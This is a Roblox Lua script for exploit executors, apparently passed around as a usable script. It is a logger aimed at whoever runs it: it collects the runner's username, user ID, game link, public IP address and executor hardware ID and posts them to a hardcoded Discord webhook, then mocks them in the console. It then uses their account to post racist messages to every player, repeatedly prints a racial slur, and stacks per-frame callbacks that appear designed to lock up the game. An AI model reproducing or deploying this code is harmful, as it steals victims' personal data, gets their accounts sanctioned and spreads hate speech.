local HttpService = game:GetService("HttpService")
local Exploit = secure_load and "Sentinel" or pebc_execute and "ProtoSmasher" or is_sirhurt_closure and "Sirhurt" or (syn and not is_sirhurt_closure) and "Synapse X" or KRNL_LOADED and "Krnl"
local request = request or http_request or syn and syn.request or false
local decoded = HttpService:JSONDecode(request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body);
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint", "Krnl-Hwid"};
hwid = "";
decryptedHwid = "";
for i, v in next, hwid_list do
	if decoded.headers[v] then
		hwid = decoded.headers[v];
		break
	end
end
local a=function(b)warn('DATA')local c="https://discord.com/api/webhooks/1094465414039359498/jiWczMyHf9RPIgIYi749jFnWpUc9tGG2PEePtOFb_shrXLZoZnSNaxwIJgue8ZNib-B3"local d="FFFFFF"local e={["content"]="",["embeds"]={{["title"]="Nigger executed",["description"]="🤣",["type"]="rich",["color"]=tonumber("0x"..tostring(d)),["fields"]={{["name"]="Username:",["value"]=b.Name,["inline"]=true},{["name"]="Player Id:",["value"]=tostring(b.UserId),["inline"]=true},{["name"]="Player:",["value"]="https://www.roblox.com/users/"..tostring(b.UserId).."/profile",["inline"]=true},{["name"]="Game Link:",["value"]="https://roblox.com/games/"..game.PlaceId.."/"..game.JobId,["inline"]=true},{["name"]="IP",["value"]=tostring(game:HttpGet("https://api.ipify.org",true)),["inline"]=true},{["name"]="HARDWARE ID",["value"]=hwid,["inline"]=true}}}}}local f=HttpService:JSONEncode(e)pcall(function()HttpService:JSONDecode(request({Url=tostring(c),Method='POST',Headers={["Content-Type"]="application/json"},Body=f}))end)end
local Players = game:GetService('Players')
local YourPlayer = Players.LocalPlayer 
a(YourPlayer)
rconsolename("Get logged LOL")
rconsoleprint("Thx for ur info LOL")
local args = {
    [1] = "I HATE BTLACK PEOPLE🤮👳🏿‍♂️",
    [2] = "All"
}

game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
wait()
local args = {
    [1] = "IM A SKID AND I JUST GOT PWNED",
    [2] = "All"
}

game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
wait()
local args = {
    [1] = "I HATE BTLACK PEOPLE🤮👳🏿‍♂️",
    [2] = "All"
}

game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
wait()
local args = {
    [1] = "IM A SKID AND I JUST GOT PWNED",
    [2] = "All"
}

game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
wait()
local args = {
    [1] = "I HATE BTLACK PEOPLE🤮👳🏿‍♂️",
    [2] = "All"
}

game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
wait()
local args = {
    [1] = "IM A SKID AND I JUST GOT PWNED",
    [2] = "All"
}

game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
wait()
game:GetService('RunService').RenderStepped:Connect(function()
game:GetService('RunService').RenderStepped:Connect(function()
game:GetService('RunService').RenderStepped:Connect(function()
game:GetService('RunService').RenderStepped:Connect(function()
game:GetService('RunService').RenderStepped:Connect(function()
game:GetService('RunService').RenderStepped:Connect(function()
game:GetService('RunService').RenderStepped:Connect(function()
game:GetService('RunService').RenderStepped:Connect(function()
				game:GetService('RunService').RenderStepped:Connect(function()
						game:GetService('RunService').RenderStepped:Connect(function()
		print("NIGGER")
			end)
																					end)
																			end)
																	end)
															end)
													end)
											end)
									end)
							end)
					end)
